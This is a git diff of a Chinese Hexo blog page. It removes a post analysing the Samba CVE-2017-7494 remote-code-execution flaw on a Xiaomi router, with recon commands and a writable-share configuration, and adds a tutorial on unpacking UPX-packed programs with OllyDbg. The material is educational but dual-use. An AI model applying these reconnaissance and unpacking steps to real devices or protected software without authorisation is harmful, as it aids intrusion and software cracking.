@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Samba,远程执行,CVE,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,32 +79,29 @@
 
 
 
-<meta name="description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
-<meta name="keywords" content="Samba,远程执行,CVE">
+<meta name="description" content="壳是最早出现的一种专用加密软件技术。一些软件会采取加壳保护的方式。壳附加在原始程序上，通过Windows加载器载入内存后，先于原始程序执行，以得到控制权，在执行的过程中对原始程序进行解密还原，然后把控制权还给原始程序，执行原来的代码。加上外壳后，原始程序在磁盘文件中一般是以加密后的形式存在的，只在执行时在内存中还原。这样可以有效防止破解者对程序文件进行非法修改，也可以防止程序被静态反编译。 壳的加">
 <meta property="og:type" content="article">
-<meta property="og:title" content="小米路由器与Samba漏洞CVE-2017-7494">
-<meta property="og:url" content="https://cool-y.github.io/2019/03/25/Samba-CVE/index.html">
+<meta property="og:title" content="pack and unpack">
+<meta property="og:url" content="https://cool-y.github.io/2019/05/14/pack-and-unpack/index.html">
 <meta property="og:site_name" content="混元霹雳手">
-<meta property="og:description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
+<meta property="og:description" content="壳是最早出现的一种专用加密软件技术。一些软件会采取加壳保护的方式。壳附加在原始程序上，通过Windows加载器载入内存后，先于原始程序执行，以得到控制权，在执行的过程中对原始程序进行解密还原，然后把控制权还给原始程序，执行原来的代码。加上外壳后，原始程序在磁盘文件中一般是以加密后的形式存在的，只在执行时在内存中还原。这样可以有效防止破解者对程序文件进行非法修改，也可以防止程序被静态反编译。 壳的加">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-59-58.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-01-19.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-09-40.png">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/23-15-57.png">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-38-48.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-14-43.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-48-27.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-18-44.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-26-47.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-38-28.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-43-02.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-45-01.png">
-<meta property="og:updated_time" content="2019-04-15T07:35:38.080Z">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557817831/%E5%8A%A0%E5%A3%B3/1.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557817867/%E5%8A%A0%E5%A3%B3/2.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557819108/%E5%8A%A0%E5%A3%B3/3.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557819290/%E5%8A%A0%E5%A3%B3/4.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557820111/%E5%8A%A0%E5%A3%B3/5.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557821441/%E5%8A%A0%E5%A3%B3/6.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557836854/%E5%8A%A0%E5%A3%B3/7.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557837144/%E5%8A%A0%E5%A3%B3/8.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557837250/%E5%8A%A0%E5%A3%B3/9.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557837519/%E5%8A%A0%E5%A3%B3/10.png">
+<meta property="og:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557837859/%E5%8A%A0%E5%A3%B3/11.png">
+<meta property="og:updated_time" content="2019-05-17T08:21:24.916Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="小米路由器与Samba漏洞CVE-2017-7494">
-<meta name="twitter:description" content="小米路由器与Samba漏洞CVE-2017-7494漏洞描述Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。具体执行条件如下：  服务器打开了文件/打印机共享端口445，让其能够在公网上访问  共享文件拥有写入权限  恶意攻击者需猜解Samba服务端共享目录的物理路径   Samba介绍Samba是在Lin">
-<meta name="twitter:image" content="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png">
+<meta name="twitter:title" content="pack and unpack">
+<meta name="twitter:description" content="壳是最早出现的一种专用加密软件技术。一些软件会采取加壳保护的方式。壳附加在原始程序上，通过Windows加载器载入内存后，先于原始程序执行，以得到控制权，在执行的过程中对原始程序进行解密还原，然后把控制权还给原始程序，执行原来的代码。加上外壳后，原始程序在磁盘文件中一般是以加密后的形式存在的，只在执行时在内存中还原。这样可以有效防止破解者对程序文件进行非法修改，也可以防止程序被静态反编译。 壳的加">
+<meta name="twitter:image" content="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557817831/%E5%8A%A0%E5%A3%B3/1.png">
 
 
 
@@ -134,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="https://cool-y.github.io/2019/03/25/Samba-CVE/">
+  <link rel="canonical" href="https://cool-y.github.io/2019/05/14/pack-and-unpack/">
 
 
 
 
 
-  <title>小米路由器与Samba漏洞CVE-2017-7494 | 混元霹雳手</title>
+  <title>pack and unpack | 混元霹雳手</title>
   
 
 
@@ -319,7 +316,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/03/25/Samba-CVE/">
+    <link itemprop="mainEntityOfPage" href="https://cool-y.github.io/2019/05/14/pack-and-unpack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Cool-Y">
@@ -336,7 +333,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">小米路由器与Samba漏洞CVE-2017-7494</h1>
+          <h1 class="post-title" itemprop="name headline">pack and unpack</h1>
         
 
         <div class="post-meta">
@@ -348,8 +345,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-25T13:45:16+08:00">
-                2019-03-25
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-14T11:20:59+08:00">
+                2019-05-14
               </time>
             
 
@@ -359,28 +356,6 @@
           </span>
 
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/IOT/" itemprop="url" rel="index">
-                    <span itemprop="name">IOT</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -389,8 +364,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/03/25/Samba-CVE/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/03/25/Samba-CVE/" itemprop="commentsCount"></span>
+                <a href="/2019/05/14/pack-and-unpack/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/05/14/pack-and-unpack/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -398,7 +373,7 @@
 
           
           
-             <span id="/2019/03/25/Samba-CVE/" class="leancloud_visitors" data-flag-title="小米路由器与Samba漏洞CVE-2017-7494">
+             <span id="/2019/05/14/pack-and-unpack/" class="leancloud_visitors" data-flag-title="pack and unpack">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -421,7 +396,7 @@
                 </span>
                 
                 <span title="字数统计">
-                  1.6k 字
+                  3.6k 字
                 </span>
               
 
@@ -435,7 +410,7 @@
                 </span>
                 
                 <span title="阅读时长">
-                  6 分钟
+                  12 分钟
                 </span>
               
             </div>
@@ -456,40 +431,57 @@
       
 
       
-        <h1 id="小米路由器与Samba漏洞CVE-2017-7494"><a href="#小米路由器与Samba漏洞CVE-2017-7494" class="headerlink" title="小米路由器与Samba漏洞CVE-2017-7494"></a>小米路由器与Samba漏洞CVE-2017-7494</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。<br>具体执行条件如下：</p>
+        <p>壳是最早出现的一种专用加密软件技术。一些软件会采取加壳保护的方式。<br>壳附加在原始程序上，通过Windows加载器载入内存后，先于原始程序执行，以得到控制权，在执行的过程中对原始程序进行解密还原，然后把控制权还给原始程序，执行原来的代码。<br>加上外壳后，原始程序在磁盘文件中一般是以加密后的形式存在的，只在执行时在内存中还原。这样可以有效防止破解者对程序文件进行非法修改，也可以防止程序被静态反编译。</p>
+<h1 id="壳的加载过程"><a href="#壳的加载过程" class="headerlink" title="壳的加载过程"></a>壳的加载过程</h1><p>壳和病毒在某些地方类似，都需要获得比原程序更早的控制权。壳修改了原程序执行文件的组织结构，从而获得控制权，但不会影响原程序正常运行。</p>
 <ol>
-<li><p>服务器打开了文件/打印机共享端口445，让其能够在公网上访问</p>
+<li>保存入口参数<br>加壳程序在初始化时会保存各寄存器的值，待外壳执行完毕，再恢复各寄存器的内容，最后跳回原程序执行。通常用pushad/popad等指令保存和恢复现场环境。</li>
+<li>获取壳本身需要使用的API地址<br>一般情况下，外壳的输入表中只有GetProcAddress、GetModuleHandle和LoadLibrary这三个API函数，甚至只有Kernel32.dll及GetProcAddress。如果需要其他API函数，可以通过LoadlibraryA或LoadlibraryExA将DLL文件映像映射到调用进程的地址空间中，函数返回的HINSTANCE值用于标识文件映像所映射的虚拟内存地址。</li>
+<li>解密原程序各个区块的数据<br>在程序执行时，外壳将解密区块数据，使程序正常运行。</li>
+<li>IAT的初始化<br>IAT的填写本来由PE装载器实现，但由于在加壳时构造了一个自建输入表，并让PE文件头数据目录表中的输入表指针指向自建输入表，PE装载器转而填写自建输入表，程序的原始输入表被外壳变形后存储，IAT的填写会由外壳程序实现。外壳从头到尾扫描变形后的输入表结构，重新获得引入函数地址，填写在IAT中。</li>
+<li>重定位项的处理<br>针对加壳的DLL</li>
+<li>Hook API<br>壳在修改原程序文件的输入表后自己模仿操作系统的流程，向输入表填充相关数据。在填充过程中，外壳可以填充Hook API代码的地址，从而获得程序控制权。</li>
+<li>跳转到OEP</li>
+</ol>
+<h1 id="通用脱壳方法"><a href="#通用脱壳方法" class="headerlink" title="通用脱壳方法"></a>通用脱壳方法</h1><p>通常脱壳的基本步骤如下:<br>1:寻找OEP<br>2:转储(PS:传说中的dump)<br>3:修复IAT(修复导入表)<br>4:检查目标程序是否存在AntiDump等阻止程序被转储的保护措施,并尝试修复这些问题。<br>以上是脱壳的经典步骤,可能具体到不同的壳的话会有细微的差别。</p>
+<h2 id="寻找OEP"><a href="#寻找OEP" class="headerlink" title="寻找OEP"></a>寻找OEP</h2><h3 id="搜索JMP或者CALL指令的机器码-即一步直达法-只适用于少数壳-包括UPX-ASPACK壳"><a href="#搜索JMP或者CALL指令的机器码-即一步直达法-只适用于少数壳-包括UPX-ASPACK壳" class="headerlink" title="搜索JMP或者CALL指令的机器码(即一步直达法,只适用于少数壳,包括UPX,ASPACK壳)"></a>搜索JMP或者CALL指令的机器码(即一步直达法,只适用于少数壳,包括UPX,ASPACK壳)</h3><p> 对于一些简单的壳可以用这种方式来定位OEP,但是对于像AsProtect这类强壳(PS:AsProtect在04年算是强壳了,嘿嘿)就不适用了,我们可以直接搜索长跳转JMP(0E9)或者CALL(0E8)这类长转移的机器码,一般情况下(理想情况)壳在解密完原程序各个区段以后,需要一个长JMP或者CALL跳转到原程序代码段中的OEP处开始执行原程序代码。按CTRL+B组合键搜索一下JMP的机器码E9(CTRL+L查看下一个）,看看有没有这样一个JMP跳转到原程序的代码段。</p>
+<h3 id="使用OllyDbg自带的功能定位OEP-SFX法"><a href="#使用OllyDbg自带的功能定位OEP-SFX法" class="headerlink" title="使用OllyDbg自带的功能定位OEP(SFX法)"></a>使用OllyDbg自带的功能定位OEP(SFX法)</h3><p>演示这种方法目标程序我们还是选择CRACKME UPX.EXE,用OD加载该程序,然后选择菜单项Options-Debugging options-SFX。该选项只有当OllyDbg发现壳的入口点位于代码段之外的时候才会起作用,壳的入口点位于代码段中的情况还是比较少见的。</p>
+<h3 id="使用Patch过的OD来定位OEP-即内存映像法"><a href="#使用Patch过的OD来定位OEP-即内存映像法" class="headerlink" title="使用Patch过的OD来定位OEP(即内存映像法)"></a>使用Patch过的OD来定位OEP(即内存映像法)</h3><p>正常的内存访问断点读取,写入,执行的时候都会断下来,该Patch过的OD内存访问断点仅当执行的时候才会断下来,我们可以利用这一点来定位OEP。<br>UPX壳的解密例程会解密原程序的各个区段并将各个区段原始字节写回到原处,我们最好不要在解密区段的过程中断下来,说不定要断成千上万次才能到达OEP,这里有了这个Patch过的OD就方便多了,其内存访问断点仅当执行的时候才会断下来,当其在执行第一个区段中的代码时,基本上就可以断定是OEP了。</p>
+<h3 id="堆栈平衡法-即ESP定律法"><a href="#堆栈平衡法-即ESP定律法" class="headerlink" title="堆栈平衡法(即ESP定律法)"></a>堆栈平衡法(即ESP定律法)</h3><p>这种方法适用于一些古老的壳。这些壳首先会使用PUSHAD指令保存寄存器环境,在解密各个区段完毕,跳往OEP之前,会使用POPAD指令恢复寄存器环境。<br>有的情况下保存寄存器环境可能不是第一条指令,但也在附近了,还有些情况下,有些壳不使用PUSHAD,而是逐一PUSH各个寄存器(例如:PUSH EAX,PUSH EBX等等),总而言之,在解密完区段,跳往OEP之前会恢复寄存器环境。<br>按F7键执行PUSHAD:可以看到各个寄存器的初始值被压入到堆栈中了,这里我们可以对这些初始值设置内存或者硬件访问断点,当解密例程读取这些初始值的时候就会断下来,断下来处基本上就在OEP附近了。<br>这里我们可以通过在ESP寄存器值上面单击鼠标右键选择-Follow in dump在数据窗口中定位到这些寄存器的初始值。对这些初始值的第一个字节或者前4个字节设置硬件访问断点。当壳的解密例程读取该值的时候断了下来，停在popad的下一行,紧接着下面就是跳往OEP处,说明这个方法起作用了。</p>
+<h3 id="VB应用程序定位OEP法-Native-或者-P-CODE"><a href="#VB应用程序定位OEP法-Native-或者-P-CODE" class="headerlink" title="VB应用程序定位OEP法(Native 或者 P-CODE)"></a>VB应用程序定位OEP法(Native 或者 P-CODE)</h3><p>定位VB程序的OEP比较容易,因为VB应用程序都有一个特点-开始都是一个PUSH指令,紧接着一个CALL指令调用一个VB API函数。我们可以使用Patch过的OD,首先定位到VB的动态库,接着给该动态库的代码段设置内存访问断点,<br>当壳的解密例程解密完原程序各个区段,接着就会断在VB DLL的第一条指令处,接着我们可以在堆栈中定位到返回地址,就可以来到OEP的下一条指令处。这里我们也可以使用前面介绍的方法-跟逐一给各个区段设置内存访问断点(使用Patch过的OD),但是很多壳会检测这种方法,所以大家可能根据需要不同的情况来尝试这不同的方法。这种方法很容易理解,我就不举例子了,以后大家如果遇到了VB程序可以试试这种方法。</p>
+<h3 id="最后一次异常法"><a href="#最后一次异常法" class="headerlink" title="最后一次异常法"></a>最后一次异常法</h3><p>如果我们在脱壳的过程中发现目标程序产生大量异常的话,就可以使用最后一次异常法,将EXCEPTIONS菜单项中的忽略各个异常的选项都勾选上,运行起来。这里我们可以看到产生了好几处异常,但是都不是位于第一个区段,说明这些异常不是在原程序运行期间发生的,是在壳的解密例程执行期间产生的异常。重新启动OD,将EXCEPTIONS菜单项中忽略的异常选项的对勾都去掉,仅保留Ignore memory access violations in KERNEL32这个选项的对勾。按SHIFT + F9忽略异常继续运行,我们直到最后一次异常。<br>接着我们可以 <strong><em>对代码段设置内存访问断点</em></strong> ,可能有人会问,为什么不在一开始设置内存访问断点呢?原因是很多壳会检测程序在开始时是否自身被设置内存访问断点,如果执行到了最后一次异常处的话,很可能已经绕过了壳的检测时机！</p>
+<h3 id="用壳最常用的API函数来定位OEP"><a href="#用壳最常用的API函数来定位OEP" class="headerlink" title="用壳最常用的API函数来定位OEP"></a>用壳最常用的API函数来定位OEP</h3><p>将忽略的异常选项都勾选上,我们来定位一下壳最常用的API函数,比如GetProcAddress,LoadLibrary。ExitThread有些壳会用。<br>使用bp GetProcAddress命令给该API函数设置一个断点。我们只需要知道壳在哪些地方调用GetProcAddress,所以我们在断下来的这一行上面单击鼠标右键选择-Breakpoint-Conditional log,来设置条件记录。将Pause program这一项勾选上Never,记录的表达式设置为[ESP],也就是记录返回地址,这样我们就能知道哪些地方调用GetProcAddress。接着在日志窗口中单击鼠标右键选择-Clear Log(清空日志)。运行起来,我们可以看到程序的主窗口弹了出来,打开日志窗口,看看最后一次GetProcAddress(排除掉第一个区段中调用的位置)是在哪里被调用的。<br>我们可以在 <strong><em>对代码段设置内存访问断点</em></strong> 之前尝试一下这种方法,这样就可以绕过很多壳对内存断点的检测,但是有一些壳也会对API函数断点进行检测,所以说我们需要各种方式都尝试一下,找到最合适的。</p>
+<h3 id="利用应用程序调用的第一个API函数来定位OEP"><a href="#利用应用程序调用的第一个API函数来定位OEP" class="headerlink" title="利用应用程序调用的第一个API函数来定位OEP"></a>利用应用程序调用的第一个API函数来定位OEP</h3><h1 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h1><p>压缩壳的特点就是减小软件的体积，加密保护不是重点。目前，兼容性和稳定性较好的压缩壳有UPX、ASPack、PECompact等。</p>
+<h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a><a href="https://upx.github.io/" target="_blank" rel="noopener">UPX</a></h2><p>UPX-the Ultimate Packer for eXecutables是以命令行方式操作的可执行文件压缩程序。<br>UPX早期的压缩引擎是有UPX自己实现的，其3.x版本也支持LZMA第三方压缩引擎。UPX除了对目标程序进行压缩，也可以解压缩。它不包含任何反调试或保护策略。另外，UPX保护工具UPXPR、UPX-sCRAMBLER等可修改UPX加壳标志，使其自解压功能失效。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file</span><br></pre></td></tr></table></figure></p>
+<h3 id="识别UPX加壳"><a href="#识别UPX加壳" class="headerlink" title="识别UPX加壳"></a>识别UPX加壳</h3><p>被加壳程序：点击按钮之后弹框</p>
+<ol>
+<li><p>导入函数很少<br>未加壳程序的导入函数：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557817831/%E5%8A%A0%E5%A3%B3/1.png" alt><br>加壳后的导入函数：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557817867/%E5%8A%A0%E5%A3%B3/2.png" alt></p>
 </li>
-<li><p>共享文件拥有写入权限</p>
+<li><p>使用IDA识别代码段<br>只有少量的代码被识别</p>
 </li>
-<li><p>恶意攻击者需猜解Samba服务端共享目录的物理路径</p>
+<li><p>使用OllyDbg打开程序，警告被加壳<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557819108/%E5%8A%A0%E5%A3%B3/3.png" alt></p>
+</li>
+<li><p>程序的节名包含加壳器的标识<br>加壳后的程序节名为UPX0、UPX1、rsrc</p>
+</li>
+<li><p>程序拥有不正常的节大小。例如.text节的原始数据大小为0，但虚拟大小非0<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557819290/%E5%8A%A0%E5%A3%B3/4.png" alt></p>
+</li>
+<li><p>使用加壳探测工具如PEiD<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557820111/%E5%8A%A0%E5%A3%B3/5.png" alt></p>
+</li>
+<li><p>熵值计算<br>压缩或加密数据更接近于随机数据，熵值更高。如使用PEiD计算熵值<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557821441/%E5%8A%A0%E5%A3%B3/6.png" alt><br>PEiD计算熵值的方法：<br>1.重新组织需要计算的数据<br>i．以下数据不列入计算熵的范围：导出表数据、导入表数据、资源数据、重定向数据。<br>ii.  尾部全0的数据不列入计算熵的范围。<br>iii. PE头不列入计算熵的范围。<br>2.分别计算每一部分数据的熵E和该部分数据大小S。<br>3.以下列公式得到整个PE文件的熵 Entropy = ∑Ei * Si / ∑Si (i = 1,2…n)。</p>
 </li>
 </ol>
-<h2 id="Samba介绍"><a href="#Samba介绍" class="headerlink" title="Samba介绍"></a>Samba介绍</h2><p>Samba是在Linux和Unix系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。</p>
-<p>SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。</p>
-<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>处于\source3\rpc_server\src_pipe.c的is_known_pipename()函数未对传进来的管道名pipename的路径分隔符/进行识别过滤，导致可以用绝对路径调用恶意的so文件，从而远程任意代码执行。<br>首先看到is_known_pipename()函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png" alt></p>
-<p>跟进到smb_probe_module()<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-59-58.jpg" alt></p>
-<p>再跟进到do_smb_load_module()，发现调用的过程就在其中,调用了传进来的moudule_name对应的init_samba_module函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-01-19.jpg" alt></p>
-<p>我们可以通过smb服务上传一个恶意的so文件，该文件包含一个输出函数init_samba_module，随后通过上述过程进行调用，执行任意代码。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="小米路由器"><a href="#小米路由器" class="headerlink" title="小米路由器"></a>小米路由器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -apnt</span><br><span class="line">tcp    0   0 192.168.31.1:445   0.0.0.0:*     LISTEN   0 572 1917/smbd</span><br><span class="line"></span><br><span class="line">nmap 192.168.31.1</span><br><span class="line">139/tcp  open     netbios-ssn</span><br><span class="line">445/tcp  open     microsoft-ds</span><br></pre></td></tr></table></figure>
-<p><strong><em>端口已开启</em></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br><span class="line">        deadtime = 30</span><br><span class="line">        domain master = yes</span><br><span class="line">        encrypt passwords = true</span><br><span class="line">        enable core files = no</span><br><span class="line">        guest account = nobody</span><br><span class="line">        guest ok = yes</span><br><span class="line">        invalid users =</span><br><span class="line">        local master = yes</span><br><span class="line">        load printers = no</span><br><span class="line">        map to guest = Bad User</span><br><span class="line">        min receivefile size = 16384</span><br><span class="line">        null passwords = yes</span><br><span class="line">        obey pam restrictions = yes</span><br><span class="line">        passdb backend = smbpasswd</span><br><span class="line">        preferred master = yes</span><br><span class="line">        printable = no</span><br><span class="line">        smb encrypt = disabled</span><br><span class="line">        smb passwd file = /etc/samba/smbpasswd</span><br><span class="line">        socket options =  SO_SNDBUFFORCE=1048576 SO_RCVBUFFORCE=1048576</span><br><span class="line">        smb2 max trans = 1048576</span><br><span class="line">        smb2 max write = 1048576</span><br><span class="line">        smb2 max read = 1048576</span><br><span class="line">        write cache size = 262144</span><br><span class="line">        syslog = 2</span><br><span class="line">        syslog only = yes</span><br><span class="line">        use sendfile = yes</span><br><span class="line">        writeable = yes</span><br><span class="line">        log level = 1</span><br><span class="line">        unicode = True</span><br><span class="line">        max log size = 500</span><br><span class="line">        log file = /tmp/log/samba.log</span><br><span class="line">        server role = STANDALONE</span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">        comment     = Home Directories</span><br><span class="line">        browsable   = no</span><br><span class="line">        read only   = no</span><br><span class="line">        create mode = 0750</span><br><span class="line"></span><br><span class="line">[data]                    ***SMB_SHARE_NAME***</span><br><span class="line">        path = /tmp       ***SMB_FOLDER***</span><br><span class="line">        read only = no    ***具备可写权限***</span><br><span class="line">        guest ok = yes    ***允许匿名***</span><br><span class="line">        create mask = 0777</span><br><span class="line">        directory mask = 0777</span><br></pre></td></tr></table></figure></p>
-<p><strong><em>具有可写权限、目录为/tmp</em></strong></p>
